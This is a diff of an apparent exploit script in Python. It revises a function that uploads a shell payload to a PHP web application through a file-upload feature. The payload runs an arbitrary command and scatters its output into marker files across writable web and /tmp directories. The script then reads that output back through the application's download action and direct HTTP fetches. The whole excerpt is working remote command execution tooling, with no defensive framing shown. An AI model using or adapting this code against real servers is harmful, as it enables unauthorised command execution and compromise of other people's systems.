@@ -180,26 +180,33 @@ def run_cmd(o, base, mid, pid, _lhost, cmd, wait=9):
     served docroot. Returns the output after the marker."""
     marker = "SX" + os.urandom(4).hex()
     name = marker + ".xml"
+    # Shotgun the write: build the marker file once, copy it into every writable
+    # dir under the docroot + /tmp + every dir that currently holds one of our
+    # .p7m uploads. One of those is the dir op=download/getFileList reads.
     payload = "\n".join([
-        f"R={DOCROOT}",
-        'P=$(find "$R" -name "*.p7m" 2>/dev/null | head -1)',
-        'D=$(dirname "$P" 2>/dev/null)',
-        'for d in "$D" $(find "$R" -type d -writable 2>/dev/null); do',
-        f'  {{ echo {marker}; {cmd}; }} > "$d/{name}" 2>/dev/null',
+        f'{{ echo {marker}; {cmd}; }} > /tmp/.{marker} 2>/dev/null',
+        'DIRS=$(find /var/www /tmp -maxdepth 7 -type d -writable 2>/dev/null)',
+        'PD=$(find /var/www /tmp -name "*.p7m" -exec dirname {} \\; 2>/dev/null)',
+        'for d in $DIRS $PD; do',
+        f'  cp /tmp/.{marker} "$d/{name}" 2>/dev/null',
         'done',
+        f'rm -f /tmp/.{marker} 2>/dev/null',
     ])
     upload(o, base, mid, pid, payload)
     deadline = time.time() + wait
     while time.time() < deadline:
-        for fid in range(0, 30):
-            u = (f"{base}/actions.php?op=download&id_module={mid}"
-                 f"&id_plugin={pid}&file_id={fid}")
-            body = get(o, u)
+        # 1) op=download streams file content from the sales import dir by index
+        for fid in range(0, 40):
+            body = get(o, f"{base}/actions.php?op=download&id_module={mid}"
+                          f"&id_plugin={pid}&file_id={fid}")
             if marker in body:
                 return body.split(marker, 1)[1].strip()
-            if not body:            # index past the end of the file list
-                break
-        time.sleep(0.5)
+        # 2) direct HTTP fetch if any served+writable dir got it
+        for _s, up in KNOWN:
+            body = get(o, base + "/" + up + name)
+            if marker in body:
+                return body.split(marker, 1)[1].strip()
+        time.sleep(0.6)
     return ""
 
 
